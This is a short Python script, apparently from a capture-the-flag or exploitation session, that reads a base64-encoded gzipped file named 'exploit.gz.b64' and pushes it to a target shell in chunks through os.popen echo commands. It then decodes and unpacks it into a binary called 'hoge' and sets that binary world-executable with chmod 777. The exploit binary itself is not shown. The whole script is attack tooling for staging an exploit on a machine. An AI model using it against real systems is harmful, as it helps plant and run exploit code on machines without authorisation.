with open("./exploit.gz.b64", 'r') as f:
  binary = f.read()
import os

progress = 0
N = 0x300
print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
  os.popen('echo -n "{}" >> hoge.gz.b64'.format(s))
  progress += N
  if progress % N == 0:
    print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(len(binary))))
os.popen('base64 -d hoge.gz.b64 > hoge.gz')
os.popen('gunzip ./hoge.gz').read()
os.chmod(os.getcwd()+"/hoge", 0o777)
